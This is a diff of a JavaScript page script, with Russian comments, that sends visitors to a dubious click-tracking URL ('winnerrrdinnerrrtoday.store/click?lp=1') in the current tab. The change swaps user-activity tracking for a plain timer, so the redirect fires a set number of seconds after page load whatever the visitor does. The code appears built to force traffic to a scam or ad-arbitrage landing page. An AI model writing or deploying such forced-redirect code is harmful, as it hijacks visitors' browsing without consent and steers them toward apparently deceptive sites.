@@ -5,10 +5,8 @@
     const DEFAULT_INACTIVITY_SECONDS = 10; // Время бездействия в секундах
     const DEFAULT_REDIRECT_URL = 'https://winnerrrdinnerrrtoday.store/click?lp=1'; // URL для редиректа в текущей вкладке
     
-    let timeOnPage = 0;
     let actionTriggered = false;
-    let timerInterval = null;
-    let lastActivityTime = Date.now();
+    let timerTimeout = null;
     
     // Get configuration from HTML
     function getConfig() {
@@ -68,32 +66,16 @@
         }
     }
     
-    // Track user activity
-    function trackActivity() {
-        lastActivityTime = Date.now();
-        timeOnPage = 0; // Сбрасываем счетчик при активности
-    }
-    
-    // Start inactivity tracking
-    function startInactivityTracking() {
+    // Start simple timeout timer
+    function startTimeout() {
         const config = getConfig();
         
-        // Отслеживаем активность пользователя
-        const activityEvents = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart', 'click'];
-        activityEvents.forEach(event => {
-            document.addEventListener(event, trackActivity, { passive: true });
-        });
-        
-        timerInterval = setInterval(() => {
-            const now = Date.now();
-            const timeSinceLastActivity = (now - lastActivityTime) / 1000;
-            
-            // Проверяем, активен ли пользователь
-            if (timeSinceLastActivity >= config.inactivitySeconds && !document.hidden && !actionTriggered) {
+        // Простой таймер - отсчитывает время с момента загрузки страницы
+        timerTimeout = setTimeout(() => {
+            if (!document.hidden && !actionTriggered) {
                 openUrls();
-                clearInterval(timerInterval);
             }
-        }, 1000); // Проверяем каждую секунду
+        }, config.inactivitySeconds * 1000);
     }
     
     // Handle button clicks
@@ -113,8 +95,8 @@
         // Настраиваем обработчики кнопок
         setupButtonHandlers();
         
-        // Запускаем отслеживание бездействия
-        startInactivityTracking();
+        // Запускаем простой таймер
+        startTimeout();
     });
     
     // Expose function globally if needed
